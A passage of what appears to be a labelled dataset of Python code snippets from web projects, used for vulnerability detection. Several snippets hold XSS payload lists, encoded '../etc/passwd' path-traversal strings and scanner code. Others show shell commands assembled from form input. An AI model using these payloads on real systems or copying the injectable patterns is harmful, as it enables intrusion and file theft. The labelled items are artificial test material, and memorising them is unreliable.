0}, {"snippet_id": 5278, "code": "'dfn', 'dialog', 'dir', 'div', 'dl', 'dt', 'element', 'em', 'embed', 'fieldset', 'figcaption', 'figure', 'font', 'footer', 'form', 'frame', 'frameset', 'h1', 'h2', 'h3', 'h4', 'h5', 'h6', 'head', 'header", "label": 0}, {"snippet_id": 9812, "code": "-identity'), url(r'^openid/provider/xrds/$', 'external_auth.views.provider_xrds', name='openid-provider-xrds') ) if settings.MITX_FEATURES.get('ENABLE_PEARSON_LOGIN', False): urlpatterns +=url(r'^testcenter", "label": 0}, {"snippet_id": 30558, "code": " \t\tgrep_act ='|grep' \telse: \t\tgrep_act='' \t\tgrep='' \t\t \tif serv=='haproxy-wi.access.log': \t\tcmd=\"cat %s| awk -F\\\"/|:\\\" '$3>\\\"%s:00\\\" && $3<\\\"%s:00\\\"' |tail -%s %s %s\" %(apache_log_path+\"/\"+serv, date, date1", "label": 0}, {"snippet_id": 43591, "code": ": \t\t\tself._precision=frappe._dict() \t\tif cache_key not in self._precision: \t\t\tself._precision[cache_key]=frappe._dict() \t\tif fieldname not in self._precision[cache_key]: \t\t\tself._precision[cache_key][fieldname", "label": 0}, {"snippet_id": 1645, "code": ",data if data['req_body']==None: data['req_body']=\"NA\" data.pop('_id') try: data= ast.literal_eval(json.dumps(data)) except: print \"Falied to parse\" print \"Data\",data try: if data['id']==\"NA\": all_data", "label": 0}, {"snippet_id": 21358, "code": "'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/$', 'staticbook.views.html_index', name=\"html_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^", "label": 1}, {"snippet_id": 8671, "code": "'auth_password_reset_done'), url(r'^heartbeat$', include('heartbeat.urls')), ) if not settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]: urlpatterns +=( url(r'^(?i)university_profile/WellesleyX$', 'courseware", "label": 0}, {"snippet_id": 13439, "code": " +template urlpatterns +=(url(r'^%s' % key.lower(), 'static_template_view.views.render', {'template': template}, name=value),) if settings.PERFSTATS: urlpatterns +=(url(r'^reprofile$', 'perfstats.views", "label": 0}, {"snippet_id": 43421, "code": "\t\t\t\tor(df.get(\"fieldtype\")==\"Code\" and df.get(\"options\")!=\"Email\") \t\t\t\t\t\tor df.get(\"fieldtype\") in(\"Attach\", \"Attach Image\") \t\t\t\t\t\t \t\t\t\t\t\tor self.docstatus==2 \t\t\t\t\t\tor(self.docstatus==1 and not df.get(", "label": 1}, {"snippet_id": 32817, "code": "._WriteHeader('text/css') self._WriteTemplate(template) def _DoNotFound(self): self._WriteHeader('text/html', status_code=404) self.wfile.write('<html><body>%s not found</body></html>' % self.path) def", "label": 0}, {"snippet_id": 22755, "code": "+)/$', 'courseware.views.course_info', name=\"course_root\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/info$', 'courseware.views.course_info', name=\"info\"), url(r'^courses/(?P<course_id>[^/]+/[^/]", "label": 0}, {"snippet_id": 53328, "code": " extra='bundle2')] return render('editor/list_editor_bundles.mako', request,{ 'bundles': bundles }) @check_document_access_permission() def edit_bundle(request): bundle_id=request.GET.get('bundle') doc", "label": 0}, {"snippet_id": 9542, "code": ".debug_cohort_mgmt', name=\"debug_cohort_mgmt\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_notifications$', 'open_ended_grading.views.combined_notifications', name='open_ended_notifications'", "label": 0}, {"snippet_id": 12671, "code": "[^/]+)/(?P<tab_slug>[^/]+)/$', 'courseware.views.static_tab', name=\"static_tab\"), ) if settings.MITX_FEATURES.get('ENABLE_STUDENT_HISTORY_VIEW'): urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]", "label": 0}, {"snippet_id": 37761, "code": ", as_dict=1) \tfor post in posts: \t\tpost.cover_image=find_first_image(post.content) \t\tpost.published=global_date_format(post.creation) \t\tpost.content=strip_html_tags(post.content[:340]) \t\tif not post.comments", "label": 0}, {"snippet_id": 5883, "code": " return url +'/.well-known/acme-challenge/?<h1>hi' def img(self, payload): return '<img/onerror=\"%s\"/src=x>' % payload def svg(self, payload): return '<svg/onload=\"%s\"/>' % payload def style(self, payload):", "label": 1}, {"snippet_id": 4856, "code": "<meta http-equiv=\"refresh\" content=\"0;url=javascript:alert('xss');\">\"\"\", \"\"\"<meta http-equiv=\"refresh\" content=\"0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K\">\"\"\", \"\"\"<head><meta", "label": 1}, {"snippet_id": 9183, "code": "<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$', 'staticbook.views.pdf_index', name=\"pdf_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)", "label": 1}, {"snippet_id": 54216, "code": " sky blue').grid(row=5) Label(main, text=\"HTTP Proxy:\",background='light sky blue').grid(row=6) Label(main, text=\"Refresh:\",background='light sky blue').grid(row=7) Label(main, text=\"Crawl\",background=", "label": 0}, {"snippet_id": 48905, "code": ".smart_list_item=smart_list_item self.column=column self.object=object def get_value(self): if self.column.render_function: return self.column.render_function(self.object) field=getattr(self.object, self", "label": 1}, {"snippet_id": 19358, "code": "'VERIFY_XSS', 'True') with self.env_var_override: suite=BokChoyTestSuite('') name='tests' self.assertEqual(suite.cmd, self._expected_command(name=name, verify_xss=True)) def test_test_dir(self): test_dir=", "label": 1}, {"snippet_id": 32711, "code": "\"doc\">') self.wfile.write(md_fragment) self.wfile.write('</div>') self._WriteTemplate('footer.html') except: raise def _DoRawSourceFile(self, full_path): self._WriteHeader('text/html') self._WriteTemplate", "label": 0}, {"snippet_id": 22447, "code": " not settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]: urlpatterns +=( url(r'^jobs$', 'static_template_view.views.render', {'template': 'jobs.html'}, name=\"jobs\"), url(r'^press$', 'student.views.press', name", "label": 0}, {"snippet_id": 25825, "code": ".TYPE_FILE: field=forms.FileField( label=q.question, required=q.required, help_text=help_text, initial=initial.file if initial else None, widget=UploadedFileWidget(position=pos, event=event, answer=initial), ", "label": 0}, {"snippet_id": 3994, "code": ".headers,\"res_body\": ref_header_xss.text} dbupdate.insert_record(attack_result) return def xss_get_url(url,method,headers,body,scanid=None): result='' xss_payloads=fetch_xss_payload() uri_check_list=['?', '", "label": 0}, {"snippet_id": 3009, "code": ":{\"scan_data\": vul_param+\" parameters are vulnerable to XSS\"}}) def xss_check(url,method,headers,body,scanid): if method=='GET' or method=='DEL': xss_get_uri(url,method,headers,body,scanid) xss_get_url", "label": 0}, {"snippet_id": 8285, "code": "-identity'), url(r'^openid/provider/xrds/$', 'external_auth.views.provider_xrds', name='openid-provider-xrds') ) if settings.MITX_FEATURES.get('ENABLE_PEARSON_LOGIN', False): urlpatterns +=url(r'^testcenter", "label": 0}, {"snippet_id": 29249, "code": " as e: \t\terror=e \t\tpass \ttry: \t\tsftp=ssh.open_sftp() \t\tfile=sftp.put(file, full_path) \t\tsftp.close() \t\tssh.close() \texcept Exception as e: \t\terror=e \t\tpass \t\t \treturn error \t def upload_and_restart(serv", "label": 0}, {"snippet_id": 22234, "code": ", url(r'^accounts/login$', 'student.views.accounts_login', name=\"accounts_login\"), url(r'^login_ajax$', 'student.views.login_user', name=\"login\"), url(r'^login_ajax/(?P<error>[^/]*)$', 'student.views.login_user", "label": 0}, {"snippet_id": 16411, "code": "\"help_edx\"), url(r'^press/([_a-zA-Z0-9-]+)$', 'static_template_view.views.render_press_release', name='press_release'), (r'^favicon\\.ico$', 'django.views.generic.simple.redirect_to',{'url': '/static/images", "label": 0}, {"snippet_id": 1117, "code": ".insert_record(attack_result) result,db_update=True,True vul_param +=key else: result=True if vul_param=='': vul_param +=key else: vul_param +=','+key except: logs.logging.info(\"XSS: No GET param found!\"", "label": 0}, {"snippet_id": 46856, "code": "'utf-8') @property async def html_content(self): content=await self.content if not content: return '' return markdown(content) async def clear_mc(self): for key in(MC_KEY_N_COMMENTS, MC_KEY_COMMENT_LIST", "label": 1}, {"snippet_id": 6349, "code": "(self): \"\"\" SAML F-TICKS user anonymization key. If this is set, the IdP will log FTICKS data on every login. \"\"\" return self.config.get(self.section, 'fticks_secret_key') @property def fticks_format_string", "label": 0}, {"snippet_id": 7476, "code": "]*)$', 'courseware.module_render.xqueue_callback', name='xqueue_callback'), url(r'^change_setting$', 'student.views.change_setting', name='change_setting'), url(r'^calculate$', 'util.views.calculate'),", "label": 0}, {"snippet_id": 48277, "code": ".GET.get(\"redirect\"): forward_url=request.GET[\"redirect\"] else: forward_url=\"/admin\" if \"rid\" not in request.GET: return HttpResponseRedirect(\"/admin?error=Missing%20reservation%20id%20in%20request\") u", "label": 0}, {"snippet_id": 11642, "code": " 'student.views.create_exam_registration'), url(r'^password_reset/$', 'student.views.password_reset', name='password_reset'), url(r'^password_change/$', django.contrib.auth.views.password_change, name=", "label": 0}, {"snippet_id": 38765, "code": "=self.__dict__.get(key) \t\t\treturn value \t\telse: \t\t\treturn self.__dict__ \tdef getone(self, key, filters=None): \t\treturn self.get(key, filters=filters, limit=1)[0] \tdef set(self, key, value, as_value=False", "label": 0}, {"snippet_id": 55027, "code": ".prefetch_related('entity__resource') ) ] TranslationMemoryEntry.objects.bulk_create(memory_entries) @login_required(redirect_field_name='', login_url='/403') @require_POST @require_AJAX @transaction.atomic", "label": 0}, {"snippet_id": 11376, "code": ": \"\"\" Fetches the test course. \"\"\" self.imports_dir.makedirs_p() zipped_course=self.imports_dir +'demo_course.tar.gz' msg=colorize('green', \"Fetching the test course from github...\") print msg sh( 'wget", "label": 0}, {"snippet_id": 23243, "code": ".peer_grading', name='peer_grading'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes$', 'notes.views.notes', name='notes'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes/', include('notes.urls')),", "label": 0}, {"snippet_id": 50583, "code": "'receive': return self.mode_receive(request) elif dmode=='close': return self.mode_close(request) elif dmode=='keepalive': return self.mode_keepalive(request) else: return '\"\"' class AjaxWebClientSession", "label": 0}, {"snippet_id": 6224, "code": "/log/idp' maybe. \"\"\" res=self.config.get(self.section, 'logdir') if not res: res=None return res @property def logfile(self): \"\"\" Path to application logfile. Something like '/var/log/idp/eduid_idp.log", "label": 0}, {"snippet_id": 51944, "code": "+'/../vendor/') +'/') if DEBUG: DATA_UPLOAD_MAX_NUMBER_FIELDS=10000 STATICFILES_FINDERS=( 'django.contrib.staticfiles.finders.FileSystemFinder', 'django.contrib.staticfiles.finders.AppDirectoriesFinder", "label": 0}, {"snippet_id": 9255, "code": "\"courseware\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/$', 'courseware.views.index', name=\"courseware_chapter\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware", "label": 0}, {"snippet_id": 41551, "code": " import frappe, sys from frappe import _ from frappe.utils import(cint, flt, now, cstr, strip_html, \tsanitize_html, sanitize_email, cast_fieldtype) from frappe.model import default_fields from frappe.model", "label": 0}, {"snippet_id": 37916, "code": ".published_on=today() \t\t \t\tfrappe.db.sql(\"\"\"update tabBlogger set posts=(select count(*) from `tabBlog Post` \t\t\twhere ifnull(blogger,'')=tabBlogger.name) \t\t\twhere name=%s\"\"\",(self.blogger,)) \tdef on_update(self): ", "label": 0}, {"snippet_id": 3935, "code": " referer_header={\"Referer\": referer_header_value} temp_headers.update(referer_header) ref_header_xss=req.api_request(url, \"GET\", temp_headers) decoded_payload=xss_payload_decode(payload) if ref_header_xss.text", "label": 0}, {"snippet_id": 8126, "code": " urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/submission_history/(?P<student_username>[^/]*)/(?P<location>.*?)$', 'courseware.views.submission_history', name='submission_history'), )", "label": 0}, {"snippet_id": 41595, "code": " import type_map, varchar_len from frappe.utils.password import get_decrypted_password, set_encrypted_password _classes={} def get_controller(doctype): \t\"\"\"Returns the **class** object of the given DocType", "label": 0}, {"snippet_id": 46785, "code": ":%s:comment_list' MC_KEY_N_COMMENTS='comment:%s:n_comments' MC_KEY_COMMNET_IDS_LIKED_BY_USER='react:comment_ids_liked_by:%s:%s' class Comment(ReactMixin, BaseModel): github_id=fields.IntField() post_id", "label": 0}, {"snippet_id": 48419, "code": "=ArticleRequested() ar.AID=art ar.RID=current_reservation ar.amount=amount if \"srid\" in request.GET: ar.SRID=SubReservation.objects.get(id=int(request.GET[\"srid\"])) ar.notes=str(request.POST[str(\"notes_\" +str(art.id)", "label": 1}, {"snippet_id": 50132, "code": " for csessid in to_remove: sessions=self.sessionhandler.sessions_from_csessid(csessid) for sess in sessions: sess.disconnect() self.last_alive.pop(csessid, None) if not self.last_alive: self.keep_alive", "label": 0}, {"snippet_id": 3564, "code": "(decoded_payload) !=-1: impact=check_xss_impact(xss_request.headers) logs.logging.info(\"%s is vulnerable to XSS\",url) print \"%s[{0}]{1} is vulnerable to XSS%s\".format(impact,url)%(api_logger.G, api_logger", "label": 0}, {"snippet_id": 48537, "code": " function automatically crafts the required response. \"\"\" js_string: str=\"\" r: GroupReservation=None u: Profile=get_current_user(request) forward_url: str=default_foreward_url if request.GET.get(\"redirect\"):", "label": 0}, {"snippet_id": 19831, "code": ". verify_xss -when set, check for XSS vulnerabilities in the page HTML. See nosetest documentation: http://nose.readthedocs.org/en/latest/usage.html \"\"\" def __init__(self, *args, **kwargs): super(BokChoyTestSuite", "label": 0}, {"snippet_id": 45464, "code": " try: wf_doc=Document2.objects.get(uuid=coordinator.data['properties']['workflow']) wf_dir=Submission(request.user, Workflow(document=wf_doc), request.fs, request.jt, mapping).deploy() properties={'wf_application_path", "label": 0}, {"snippet_id": 28437, "code": "=\"date_in_log\": \t\tfmt=\"%b %d %H:%M:%S\" \t\t \treturn now_utc.strftime(fmt) \t\t\t def logging(serv, action, **kwargs): \timport sql \timport http.cookies \tlog_path=get_config_var('main', 'log_path') \tlogin='' ", "label": 0}, {"snippet_id": 30424, "code": ".getvalue('hour1') \tminut1=form.getvalue('minut1') \tdate=hour+':'+minut \tdate1=hour1+':'+minut1 \t \tif grep is not None: \tgrep_act ='|grep' \telse: \t\tgrep_act='' \t\tgrep='' \tsyslog_server_enable=sql.get_setting", "label": 0}, {"snippet_id": 16735, "code": "'staticbook.views.index_shifted'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/$', 'staticbook.views.pdf_index', name=\"pdf_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]", "label": 1}, {"snippet_id": 18568, "code": "/]+/[^/]+)/open_ended_flagged_problems/take_action_on_flags$', 'open_ended_grading.views.take_action_on_flags', name='open_ended_flagged_problems_take_action'), url(r'^courses/(?P<course_id>[^/]+/[^/]+", "label": 0}, {"snippet_id": 41228, "code": "(\"Blogger\",{\"name\": frappe.local.form_dict.blogger}, \"full_name\") \t\tlist_context.sub_title=_(\"Posts by{0}\").format(blogger) \t\tlist_context.title=blogger \telif frappe.local.form_dict.txt: \t\tlist_context", "label": 1}, {"snippet_id": 19246, "code": "(spec) self.assertEqual(suite.cmd, self._expected_command(name=name)) def test_class_spec(self): spec='test_foo.py:FooTest' suite=BokChoyTestSuite('', test_spec=spec) name='tests/{}'.format(spec) self.assertEqual", "label": 0}, {"snippet_id": 34765, "code": "=str(d[fieldname]) \t\treturn d \tdef init_valid_columns(self): \t\tfor key in default_fields: \t\t\tif key not in self.__dict__: \t\t\t\tself.__dict__[key]=None \t\t\tif key in(\"idx\", \"docstatus\") and self.__dict__[key", "label": 0}, {"snippet_id": 38968, "code": "+1 \t\tif not getattr(value, \"name\", None): \t\t\tvalue.__dict__['__islocal']=1 \t\treturn value \tdef get_valid_dict(self, sanitize=True, convert_dates_to_str=False): \t\td=frappe._dict() \t\tfor fieldname in self", "label": 0}, {"snippet_id": 26539, "code": "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd', '../../etc/passwd%00', '../../../etc/passwd%00', '../../../../etc/passwd", "label": 0}, {"snippet_id": 22600, "code": "(wiki_pattern())), url(r'^notify/', include(notify_pattern())), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/course_wiki/?$', 'course_wiki.views.course_wiki_redirect', name=\"course_wiki\"), url(r'^courses/(?", "label": 0}, {"snippet_id": 24696, "code": " self.fasttest: self.generate_optimized_static_assets() bokchoy_utils.clear_mongo() self.cache.flush_all() self.load_data() self.load_courses() msg=colorize('green', \"Confirming servers are running...\")", "label": 0}, {"snippet_id": 43809, "code": "\", self) \t\tif hasattr(doc, \"format_data_map\"): \t\t\treturn fieldname in doc.format_data_map \t\telse: \t\t\treturn True \tdef reset_values_if_no_permlevel_access(self, has_access_to, high_permlevel_fields): \t\t", "label": 0}, {"snippet_id": 26192, "code": "'].widget.attrs['data-required-if']=' if not event.settings.invoice_address_beneficiary: del self.fields['beneficiary'] def clean(self): data=self.cleaned_data if not data.get('is_business'): data['company", "label": 0}, {"snippet_id": 9075, "code": ".mktg_course_about', name=\"mktg_about_course\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/$', 'courseware.views.course_info', name=\"course_root\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/info$', ", "label": 0}, {"snippet_id": 4003, "code": "='' xss_payloads=fetch_xss_payload() uri_check_list=['?', '&', '=', '%3F', '%26', '%3D'] for uri_list in uri_check_list: if uri_list in url: parsed_url=urlparse.urlparse(url).scheme+\"://\"+urlparse.urlparse", "label": 0}, {"snippet_id": 42643, "code": "\t\t\tif df.fieldtype==\"Check\": \t\t\t\tself.set(df.fieldname, cint(self.get(df.fieldname))) \t\t\telif self.get(df.fieldname) is not None: \t\t\t\tif df.fieldtype==\"Int\": \t\t\t\t\tself.set(df.fieldname, cint(self.get(df", "label": 0}, {"snippet_id": 43553, "code": "\"\"Returns float precision for a particular field(or get global default). \t\t:param fieldname: Fieldname for which precision is required. \t\t:param parentfield: If fieldname is in child table.\"\"\" \t\tfrom frappe", "label": 0}, {"snippet_id": 5862, "code": " in cls.events: s +=''' %s=\"console.log('%s %s')\" ''' %(e, t, e) s +='>%s</%s>\\n' %(t, t) return cls.htmlTemplate % s @classmethod def acmehttp01(cls, url): return url +'/.well-known/acme-challenge/?<h1", "label": 0}, {"snippet_id": 53026, "code": "-1, 'can_edit_json': json.dumps(doc is None or doc.doc.get().is_editable(request.user)) }) def new_coordinator(request): return edit_coordinator(request) @check_document_modify_permission() def save_coordinator", "label": 0}, {"snippet_id": 19539, "code": ".assertRaises(BuildFailure): BokChoyTestSuite.verbosity_processes_string(suite) class TestPaverPa11yCrawlerCmd(unittest.TestCase): \"\"\" Paver pa11ycrawler command test cases. Most of the functionality is", "label": 0}, {"snippet_id": 7543, "code": ".mktg_course_about', name=\"mktg_about_course\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/$', 'courseware.views.course_info', name=\"course_root\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/info$', ", "label": 0}, {"snippet_id": 25516, "code": "'required') if self.require_all_fields and not all(v for v in value): raise forms.ValidationError(self.error_messages['incomplete'], code='required') return value class BaseQuestionsForm(forms.Form): \"\"\" This", "label": 0}, {"snippet_id": 9160, "code": "<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/(?P<page>[^/]*)$', 'staticbook.views.pdf_index', name=\"pdf_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)", "label": 1}, {"snippet_id": 31860, "code": "'haproxy_dir')+\"/\"+form.getvalue('color') \t \tfor server in servers: \t\tfunct.ssh_command(server[2],[\"sudo mkdir \"+path]) \t\terror=funct.upload(server[2], path+\"/\"+form.getvalue('bwlists_save'), list, dir=", "label": 0}, {"snippet_id": 5075, "code": "<math href=\"javascript:alert(1)\">CLICKME</math>', '<link rel=\"import\" href=\"test.svg\" />', '<iframe srcdoc=\"&lt;img src&equals;x:x onerror&equals;alert&lpar;1&rpar;&gt;\" />', ] class XSS(Fuzzer): \"\"\"generate", "label": 0}, {"snippet_id": 30005, "code": "(cert_local_dir): \t\tos.makedirs(cert_local_dir) \t \tif form.getvalue('ssl_name') is None: \t\tprint('<div class=\"alert alert-danger\">Please enter desired name</div>') \telse: \t\tname=form.getvalue('ssl_name') +'.pem'", "label": 0}, {"snippet_id": 39569, "code": ".fieldname, flt(self.get(df.fieldname))) \t\tif self.docstatus is not None: \t\t\tself.docstatus=cint(self.docstatus) \tdef _get_missing_mandatory_fields(self): \t\t\"\"\"Get mandatory fields that do not have any values\"", "label": 0}, {"snippet_id": 22195, "code": "'), url(r'^change_name$', 'student.views.change_name_request', name=\"change_name\"), url(r'^accept_name_change$', 'student.views.accept_name_change'), url(r'^reject_name_change$', 'student.views.reject_name_change", "label": 0}, {"snippet_id": 26509, "code": "%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd'", "label": 0}, {"snippet_id": 19597, "code": "{start_urls} ' '--pa11ycrawler-allowed-domains=localhost ' '--pa11ycrawler-reports-dir={report_dir} ' '--pa11ycrawler-deny-url-matcher=logout ' '--pa11y-reporter=\"1.0-json\" ' '--depth-limit=6 ' ).format", "label": 0}, {"snippet_id": 53775, "code": " BeautifulSoup import requests class Xss: def main(): user_dork=str(input(\"[Input Dork] >_ \")) req=url.PoolManager() for page in range(4): send=req.request(\"GET\", \"http://www1.search-results.com/web?q=", "label": 1}, {"snippet_id": 40872, "code": " data: \t\treturn out \t \tif filters: \t\tfor f in filters: \t\t\tfval=filters[f] \t\t\tif not isinstance(fval,(tuple, list)): \t\t\t\tif fval is True: \t\t\t\t\tfval=(\"not None\", fval) \t\t\t\telif fval is False: \t\t\t\t\tfval=(", "label": 0}, {"snippet_id": 8925, "code": "', name='root_create'), url(r'^wiki/', include(wiki_pattern())), url(r'^notify/', include(notify_pattern())), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/course_wiki/?$', 'course_wiki.views.course_wiki_redirect", "label": 0}, {"snippet_id": 17744, "code": ".views.password_change, name='auth_password_change'), url(r'^password_change_done/$', django.contrib.auth.views.password_change_done, name='auth_password_change_done'), url(r'^password_reset_confirm/(?P", "label": 0}, {"snippet_id": 4942, "code": "', '<deTails open oNToggle=confi\\u0072m()>', '<img sRc=l oNerrOr=(confirm)() x>', '<svg/x=\">\"/onload=confirm()//', '<svg%0Aonload=%09((pro\\u006dpt))()//', '<iMg sRc=x:confirm`` oNlOad=e\\u0076al(src)>',", "label": 0}, {"snippet_id": 30515, "code": "(syslog_server, commands, show_log=\"1\") \t if serv is not None and form.getvalue('rows1') is not None: \trows=form.getvalue('rows1') \tgrep=form.getvalue('grep') \thour=form.getvalue('hour') \tminut=form.getvalue(", "label": 0}, {"snippet_id": 54849, "code": "' def test_func(self): return self.request.user==self.get_object().author class CommentDelete(UserPassesTestMixin, DeleteView): \"\"\"\u5220\u9664\u8bc4\u8bba\u7684\u64cd\u4f5c\"\"\" model=Comment def get_success_url(self): return reverse('article", "label": 0}, {"snippet_id": 2583, "code": "+key if post_vul_param: dbupdate.update_record({\"scanid\": scanid},{\"$set\":{\"scan_data\": post_vul_param+\" are vulnerable to XSS\"}}) def xss_http_headers(url,method,headers,body,scanid=None): temp_headers", "label": 0}, {"snippet_id": 23479, "code": ".provider_identity', name='openid-provider-identity'), url(r'^openid/provider/xrds/$', 'external_auth.views.provider_xrds', name='openid-provider-xrds') ) if settings.MITX_FEATURES.get('ENABLE_PEARSON_LOGIN', False)", "label": 0}, {"snippet_id": 47321, "code": " HttpRequest, HttpResponseForbidden, HttpResponseBadRequest from django.shortcuts import redirect from django.contrib.auth.models import User from. import page_skeleton, magic from.form import Form, TextField,", "label": 0}, {"snippet_id": 27323, "code": " import os import re import sys import traceback import urllib.parse import jinja2 import webapp2 from base import utils from config import db_config from config import local_config from datastore import ndb", "label": 0}, {"snippet_id": 3488, "code": ".headers,\"res_body\": xss_request_url.text} dbupdate.insert_record(attack_result) def xss_get_uri(url,method,headers,body,scanid=None): db_update='' vul_param='' url_query=urlparse.urlparse(url) parsed_query", "label": 0}, {"snippet_id": 30569, "code": " awk -F\\\"/|:\\\" '$3>\\\"%s:00\\\" && $3<\\\"%s:00\\\"' |tail -%s %s %s\" %(apache_log_path+\"/\"+serv, date, date1, rows, grep_act, grep) \telse: \t\tcmd=\"cat %s| awk '$4>\\\"%s:00\\\" && $4<\\\"%s:00\\\"' |tail -%s %s %s\" %", "label": 0}, {"snippet_id": 14186, "code": "/]+/[^/]+/[^/]+)/discussion/', include('django_comment_client.urls')) ) urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/(?P<tab_slug>[^/]+)/$', 'courseware.views.static_tab', name=\"static_tab", "label": 0}, {"snippet_id": 25353, "code": "'fields'][i][2] output.append(widget.render(name +'_%s' % i, widget_value, final_attrs, renderer=renderer)) return mark_safe(self.format_output(output)) def format_output(self, rendered_widgets) -> str", "label": 0}, {"snippet_id": 42291, "code": ".valid_columns[self.doctype] \tdef is_new(self): \t\treturn self.get(\"__islocal\") \tdef as_dict(self, no_nulls=False, no_default_fields=False, convert_dates_to_str=False): \t\tdoc=self.get_valid_dict(convert_dates_to_str", "label": 0}, {"snippet_id": 20107, "code": ".xunit_report), \"--verbosity={}\".format(self.verbosity), ] return \" \".join(substring) def prepare_bokchoy_run(self): \"\"\" Sets up and starts servers for a Bok Choy run. If --fasttest is not specified then", "label": 0}, {"snippet_id": 693, "code": ".urlparse(url) parsed_query=urlparse.parse_qs(url_query.query) if parsed_query: for key,value in parsed_query.items(): try: result='' logs.logging.info(\"GET param for xss: %s\",key) xss_payloads=fetch_xss_payload", "label": 0}, {"snippet_id": 31682, "code": "=\"left\", toolbar_options=dict(logo=None)) \tshow(grid) \t if form.getvalue('get_hap_v'): \toutput=funct.check_haproxy_version(serv) \tprint(output) \t if form.getvalue('bwlists'): \tlist=os.path.dirname(os.getcwd", "label": 0}, {"snippet_id": 23410, "code": "'RESTRICT_ENROLL_BY_REG_METHOD'): urlpatterns +=( url(r'^course_specific_login/(?P<course_id>[^/]+/[^/]+/[^/]+)/$', 'external_auth.views.course_specific_login', name='course-specific-login'), url(r'^course_specific_register/(?P", "label": 0}, {"snippet_id": 49244, "code": ".get_url_with_query_params({ self.ordering_query_param: \".\".join(new_query) }) class SmartColumn(TitleFromModelFieldMixin, object): def __init__(self, model, field, column_id, query_params, ordering_query_param", "label": 0}, {"snippet_id": 19060, "code": ".run_python'), ) if settings.MITX_FEATURES.get('ENABLE_HINTER_INSTRUCTOR_VIEW'): urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/hint_manager$', 'instructor.hint_manager.hint_manager', name", "label": 0}, {"snippet_id": 42859, "code": " doctype: \t\t\t\t\t\tfrappe.throw(_(\"{0} must be set first\").format(self.meta.get_label(df.options))) \t\t\t\t \t\t\t\t \t\t\t\t \t\t\t\t \t\t\t\tfields_to_fetch=[ \t\t\t\t\t_df for _df in self.meta.get_fields_to_fetch(df.fieldname", "label": 0}, {"snippet_id": 16765, "code": ".views.pdf_index'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$', 'staticbook.views.pdf_index'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/", "label": 1}, {"snippet_id": 39282, "code": ".fieldname for df in self.meta.get_table_fields() if df.options==doctype] \t\treturn fieldname[0] if fieldname else None \tdef db_insert(self): \t\t\"\"\"INSERT the document(with valid columns) in the database.", "label": 0}, {"snippet_id": 2863, "code": ".insert_record(attack_result) def xss_get_uri(url,method,headers,body,scanid=None): db_update='' vul_param='' url_query=urlparse.urlparse(url) parsed_query=urlparse.parse_qs(url_query.query) if parsed_query", "label": 0}, {"snippet_id": 26615, "code": "%2fetc%2fpasswd%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2f", "label": 0}, {"snippet_id": 49233, "code": "\"): new_query.append(c) else: new_query.append('-{}'.format(c)) else: new_query.append(column) return self.get_url_with_query_params({ self.ordering_query_param: \".\".join(new_query) }) class SmartColumn", "label": 0}, {"snippet_id": 36262, "code": " \t\t\"\"\"Returns true if fieldname is to be hidden for print. \t\tPrint Hide can be set via the Print Format Builder or in the controller as a list \t\tof hidden fields. Example \t\t\tclass MyDoc(Document): \t\t\t\tdef", "label": 0}, {"snippet_id": 13160, "code": "/(?P<course_id>[^/]+/[^/]+/[^/]+)$', 'student.views.begin_exam_registration', name=\"begin_exam_registration\"), url(r'^create_exam_registration$', 'student.views.create_exam_registration'), url(r'^password_reset", "label": 0}, {"snippet_id": 36209, "code": ".get_field(fieldname) \t\tif not df and 